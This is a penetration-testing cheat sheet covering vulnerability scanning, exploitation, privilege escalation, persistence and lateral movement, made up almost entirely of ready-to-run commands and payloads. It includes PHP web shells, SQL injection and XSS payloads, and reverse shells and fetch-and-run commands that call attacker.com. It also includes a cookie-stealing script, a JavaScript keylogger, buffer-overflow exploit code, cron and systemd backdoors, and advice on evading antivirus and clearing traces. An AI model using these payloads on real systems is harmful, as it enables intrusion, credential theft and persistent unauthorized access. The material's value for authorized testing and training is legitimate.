# 2. Vulnerability Assessment & Exploitation

## 2.1 Vulnerability Assessment

### Vulnerability Scanning

**Nmap Vulnerability Scripts:**
```bash
# Run all vulnerability scripts
nmap --script vuln target.com

# Specific vulnerability categories
nmap --script "vuln and not intrusive" target.com
nmap --script "vuln and safe" target.com

# Auth brute force scripts
nmap --script auth-brute target.com
nmap --script ssh-brute target.com

# Database vulnerabilities
nmap --script mysql-vuln-cve2012-2122 target.com
nmap --script oracle-brute target.com
```

**Web Vulnerability Scanners:**
```bash
# Nikto comprehensive scan
nikto -h http://target.com -Tuning 1 -o nikto_output.html

# OWASP ZAP (GUI)
# Automated scan: Tools > Automated Scan
# Active Scan: Right-click URL > Attack > Active Scan

# Burp Suite Professional (GUI)
# Scanner > Do active scan

# Wfuzz for fuzzing parameters
wfuzz -z file,wordlist.txt -u "http://target.com/page?param=FUZZ"
```

### Service Vulnerability Assessment

**SMB Vulnerability Scanning:**
```bash
# Check for EternalBlue (MS17-010)
nmap --script smb-vuln-ms17-010 target.com

# Check for MS08-067
nmap --script smb-vuln-ms08-067 target.com

# Check for SMBv2 vulnerabilities
nmap -p445 --script smb-vuln-ms10-054,ms10-061 target.com

# Manual check with smbclient
smbclient -L \\\\target.com\\ -N
smbclient \\\\target.com\\IPC$ -N
```

**SSH Vulnerability Assessment:**
```bash
# SSH version and algorithm check
nmap -p22 --script ssh2-enum-algos target.com

# SSH weak algorithms detection
nmap -p22 --script ssh-hostkey --script-args ssh_hostkey=full target.com

# Check for SSH weak credentials
medusa -u root -P passwords.txt -h target.com -M ssh
hydra -l root -P passwords.txt ssh://target.com
```

**HTTP/HTTPS Vulnerability Assessment:**
```bash
# Web server vulnerabilities
nmap --script http-sql-injection target.com
nmap --script http-xssed target.com
nmap --script http-csrf target.com
nmap --script http-lfi target.com

# Directory traversal detection
nmap --script http-dir-traversal target.com

# Common web vulnerabilities
gobuster dir -u http://target.com -w /usr/share/seclists/Discovery/Web-Content/common.txt -x php
dirb http://target.com /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -X .php,.asp,.aspx
```

**Database Vulnerability Scanning:**
```bash
# MySQL vulnerabilities
nmap -p3306 --script mysql-info,mysql-vuln-cve2012-2122 target.com

# MSSQL vulnerabilities
nmap -p1433 --script ms-sql-info,ms-sql-empty-password target.com

# Oracle database
nmap -p1521 --script oracle-enum-users target.com

# Redis without authentication
nmap -p6379 --script redis-info target.com
```

### Manual Vulnerability Assessment

**File Upload Vulnerabilities:**
```bash
# Test file upload functionality
# Create test files:
echo '<?php system($_GET["cmd"]); ?>' > shell.php
echo '<?php echo passthru($_GET["cmd"]); ?>' > cmd.php
echo 'GIF89a' > image.php
cat image.php shell.php > gif_shell.php

# Upload attempts:
curl -F "file=@shell.php" http://target.com/upload.php
curl -F "file=@gif_shell.php" http://target.com/upload.php
```

**SQL Injection Testing:**
```bash
# Basic SQL injection payloads
' OR '1'='1
' OR 1=1 --
' UNION SELECT 1,2,3 --

# Error-based injection
' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) --

# Time-based injection
' AND (SELECT * FROM (SELECT(SLEEP(5)))a) --

# Boolean-based blind
' AND 1=1
' AND 1=2

# SQLmap automation
sqlmap -u "http://target.com/page?id=1" --dbs
sqlmap -u "http://target.com/login.php" --data="user=admin&pass=test" --dbs
sqlmap -r request.txt --dbs
```

**Cross-Site Scripting (XSS) Testing:**
```bash
# Reflected XSS payloads
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
"';alert('XSS');//"

# Stored XSS in comments/fields
<script>document.location='http://attacker.com/steal.php?c='+document.cookie</script>

# XSS filter bypasses
<ScRiPt>alert('XSS')</ScRiPt>
%3Cscript%3Ealert('XSS')%3C/script%3E
```

**Command Injection Testing:**
```bash
# Basic command injection payloads
; whoami
&& id
| cat /etc/passwd
`whoami`
$(id)

# Blind command injection
; sleep 10
&& ping -c 10 127.0.0.1

# Time-based detection
; if [ $(whoami) = 'root' ]; then sleep 5; fi
```

### Web Application Vulnerabilities

**Directory Traversal Testing:**
```bash
# Path traversal payloads
../../../etc/passwd
../../../../../../../../windows/win.ini
....//....//....//etc/passwd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd

# URL encoded variations
..%c0%af..%c0%af..%c0%afetc/passwd
..%252f..%252f..%252fetc%252fpasswd

# Log file injection
../../../../var/log/apache2/access.log
../../../../var/log/nginx/access.log
```

**Local File Inclusion (LFI):**
```bash
# LFI testing
?file=../../../../etc/passwd
?page=php://filter/read=convert.base64-encode/resource=config.php
?include=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+

# PHP wrappers for LFI
php://filter/convert.base64-encode/resource=index.php
php://input (POST data: <?php system($_GET['cmd']); ?>)
expect://id
```

**Remote File Inclusion (RFI):**
```bash
# RFI testing
?page=http://attacker.com/shell.txt
?include=http://attacker.com/phpinfo.php
?config=http://attacker.com/config.txt

# Create malicious file on attacker server
# shell.txt content:
<?php system($_GET['cmd']); ?>
<?php passthru($_GET['command']); ?>
```

**Authentication Bypass Testing:**
```bash
# SQL injection in login forms
admin' --
admin' OR '1'='1' --
' OR '1'='1' --
' OR '1'='1'/*

# Weak password testing
# Dictionary attacks with common passwords
admin:admin
admin:password
admin:123456
root:root

# Session testing
# Cookie manipulation
# Check for predictable session IDs
```

## 2.2 Exploitation Techniques

### Buffer Overflow Exploitation

**Windows Buffer Overflow:**
```bash
# Fuzzing to find offset
./vuln_app $(python -c 'print "A"*100')

# Create pattern
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2000
./vuln_app $(python -c 'print "PATTERN_HERE"')

# Find offset
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x6f433962

# Identify bad characters
# Create byte array
badchars = "\x00\x0a\x0d"

# Generate shellcode
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -b "\x00\x0a\x0d" -f py

# Create exploit
import struct

offset = 2003
eip = struct.pack("<I", 0x77c35459)  # JMP ESP from DLL
padding = "A" * offset
shellcode = "\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30"
payload = padding + eip + "\x90"*20 + shellcode + "C"*(3000-len(payload))

# Run exploit
./vuln_app $(python -c 'print payload')
```

**Linux Buffer Overflow:**
```bash
# Disable ASLR for testing
echo 0 > /proc/sys/kernel/randomize_va_space

# Generate shellcode
msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -b "\x00\x0a\x0d" -f py

# Use NOP sled
"\x90" * 32

# Return address (system call)
# Find JMP ESP with objdump
objdump -D /lib/ld-linux.so.2 | grep jmp\*esp

# Environment variable exploit
export SHELLCODE=$(python -c 'print "\x90"*20 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"')
export EGG=$(python -c 'print "A"*2000 + "\x7b\xff\xff\xbf"')  # NOP sled address
./vuln_app $EGG
```

### Web Application Exploitation

**File Upload Exploitation:**
```bash
# PHP web shell
<?php system($_GET['cmd']); ?>
<?php passthru($_GET['command']); ?>
<?php eval($_POST['cmd']); ?>

# Bypass file upload restrictions
# Double extension: shell.php.jpg
# Content-Type manipulation: image/jpeg
# Null byte injection: shell.php%00.jpg

# Create payload file for curl
cat > shell.php << EOF
GIF89a<?php system($_GET['cmd']); ?>
EOF

# Upload with curl
curl -F "file=@shell.php" -F "submit=upload" http://target.com/upload.php

# Execute uploaded shell
http://target.com/uploads/shell.php?cmd=id
```

**SQL Injection Exploitation:**
```bash
# Union-based injection to read files
' UNION SELECT LOAD_FILE('/etc/passwd'),2,3 --

# Write file via SQL injection
' UNION SELECT '<?php system($_GET["cmd"]);?>',2,3 INTO OUTFILE '/var/www/html/shell.php' --

# Extract database information
' UNION SELECT database(),2,3 --
' UNION SELECT table_name,2,3 FROM information_schema.tables WHERE table_schema='database'--
' UNION SELECT column_name,2,3 FROM information_schema.columns WHERE table_name='users'--

# Privilege escalation in MySQL
' UNION SELECT user(),@@version,@@datadir --

# Get MySQL user privileges
SELECT user,host,super_priv FROM mysql.user;
```

**Remote Command Execution:**
```bash
# Command execution via vulnerable parameter
; curl http://attacker.com/rev.php | php
; wget -qO- http://attacker.com/shell.txt | php
; python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("attacker.com",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'

# Netcat reverse shell
nc -nv attacker.com 4444 -e /bin/bash
bash -i >& /dev/tcp/attacker.com/4444 0>&1

# Python reverse shell
python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("attacker.com",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"])'

# PHP reverse shell
php -r '$sock=fsockopen("attacker.com",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
```

### Client-Side Exploitation

**Browser Exploitation:**
```bash
# BeEF XSS framework
# Start BeEF server
./beef

# Inject hook into vulnerable page
<script src="http://attacker.com:3000/hook.js"></script>

# Use BeEF modules after hooking browser
# Commands tab > Module Browser > Exploitation

# JavaScript keylogger
<script>
document.onkeypress = function(e) {
    fetch('http://attacker.com/log?key='+encodeURIComponent(e.key));
}
</script>
```

### Network Exploitation

**SMB Exploitation:**
```bash
# EternalBlue (MS17-010) with Metasploit
msfconsole
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS target.com
set LHOST 192.168.1.100
exploit

# EternalBlue manual
python2 ms17-010.py 192.168.1.100

# SambaCry (Linux)
nmap -p445 --script smb-vuln-ms17-010 target.com
```

**SSH Exploitation:**
```bash
# SSH private key exploitation
# If private key found, convert to John format
ssh2john id_rsa > id_rsa.hash
john --wordlist=wordlist.txt id_rsa.hash

# SSH weak credentials
medusa -H hosts.txt -U users.txt -P passwords.txt -M ssh
hydra -l admin -P passwords.txt ssh://target.com

# SSH command injection via keys
echo 'command="echoexploit"' >> ~/.ssh/authorized_keys
```

**FTP Exploitation:**
```bash
# Anonymous FTP with upload
ftp target.com
anonymous
anonymous
put shell.php

# FTP bounce attack
nmap -b user:pass@ftp.server.com target.com

# ProFTPd mod_copy
SITE CPFR /etc/passwd
SITE CPTO /tmp/passwd
```

### Database Exploitation

**MySQL Exploitation:**
```bash
# MySQL UDF (User Defined Function) privilege escalation
# After gaining MySQL access:
use mysql;
CREATE TABLE temp(line blob);
INSERT INTO temp VALUES(load_file('/lib/lib_mysqludf_sys.so'));
SELECT * FROM temp INTO DUMPFILE '/usr/lib/mysql/plugin/lib_mysqludf_sys.so';
CREATE FUNCTION do_system RETURNS INTEGER SONAME 'lib_mysqludf_sys.so';

# Execute system commands
SELECT do_system('nc -nv attacker.com 4444 -e /bin/bash');

# MySQL password hash extraction
SELECT user,password FROM mysql.user;

# Crack MySQL hashes
john mysql_hashes.txt --wordlist=wordlist.txt
```

**MSSQL Exploitation:**
```bash
# MSSQL xp_cmdshell
# Enable xp_cmdshell
EXEC sp_configure 'show advanced options', 1
RECONFIGURE
EXEC sp_configure 'xp_cmdshell', 1
RECONFIGURE

# Execute commands
EXEC xp_cmdshell 'whoami'
EXEC xp_cmdshell 'net user hacker password /add'

# MSSQL hash dumping
SELECT name, password_hash FROM sys.sql_logins

# Use mimikatz after getting SYSTEM
# Extract domain credentials
```

### Privilege Escalation Exploitation

**Linux Privilege Escalation:**
```bash
# SUID binaries
find / -perm -4000 -type f 2>/dev/null
find / -perm -2000 -type f 2>/dev/null

# Exploit SUID binaries
# Example: nmap
nmap --interactive
!sh

# Example: vim
vim -c ':!/bin/sh'

# Example: find
find /etc/passwd -exec /bin/sh \;

# Kernel exploits
searchsploit linux kernel 4.15
# Compile and run exploit

# Cron jobs
cat /etc/crontab
ls -la /etc/cron.*
cat /etc/cron.daily/*

# PATH manipulation
echo '/bin/sh' > ps
chmod 777 ps
export PATH=.:$PATH
./run_script_that_calls_ps

# Docker escape
# If in Docker container
fdisk -l
# Mount host filesystem
mount /dev/sda1 /mnt
chroot /mnt
```

**Windows Privilege Escalation:**
```bash
# Unquoted service path
wmic service get name,pathname,displayname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\"
sc config "service_name" binpath= "C:\temp\reverse.exe"
sc start "service_name"

# Weak service permissions
icacls "C:\Program Files\Service"
sc config "service_name" obj= ".\LocalSystem" type= own

# AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
# If both 1:
msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f msi > setup.msi
msiexec /quiet /qn /i setup.msi

# Stored passwords
# Check for saved credentials in apps
# Check browser passwords
# Check configuration files

# DLL hijacking
# Find missing DLLs with Process Monitor
# Create malicious DLL with DllMain
# Place in application directory
```

### Post-Exploitation Techniques

**Persistence Mechanisms:**
```bash
# Linux persistence
# Cron job
echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'" | crontab -

# SSH key
mkdir /root/.ssh 2>/dev/null
echo "ssh-rsa AAAA..." >> /root/.ssh/authorized_keys
chmod 700 /root/.ssh
chmod 600 /root/.ssh/authorized_keys

# Systemd service
cat > /etc/systemd/system/backdoor.service << EOF
[Unit]
Description=Backdoor Service

[Service]
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'
Restart=always

[Install]
WantedBy=multi-user.target
EOF
systemctl enable backdoor.service

# Windows persistence
# Scheduled task
schtasks /create /tn "Updater" /tr "C:\temp\reverse.exe" /sc onlogon

# Registry
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "Updater" /t REG_SZ /d "C:\temp\reverse.exe"

# Service
sc create "Updater" binpath= "C:\temp\reverse.exe" start= auto
```

**Lateral Movement:**
```bash
# Pass the hash
pth-winexe -U user%hash //target cmd
evil-winrm -i target -u user -H hash

# RDP with credentials
xfreerdp /u:user /p:password /v:target
rdesktop -u user -p password target

# SSH key reuse
ssh -i id_rsa user@target

# SMB relaying
# Use responder + ntlmrelayx
responder -I eth0
ntlmrelayx.py -tf targets.txt -smb2support
```

## Important Exploitation Notes

1. **Pre-Exploitation Checklist:**
   - Verify vulnerability exists
   - Test exploit in lab environment
   - Check for AV/EDR
   - Prepare reverse shell handlers
   - Have multiple exploitation methods ready

2. **During Exploitation:**
   - Monitor stability of target
   - Be prepared for system crashes
   - Have documentation ready
   - Limit scope of exploitation

3. **Post-Exploitation:**
   - Establish stable access
   - Document all findings
   - Clean up traces
   - Prepare proof of concept

4. **Common Issues:**
   - Exploit crashes: Try alternative methods
   - Shell不稳定: Upgrade to full shell
   - Network restrictions: Use port tunneling
   - AV detection: Encode or use alternative payload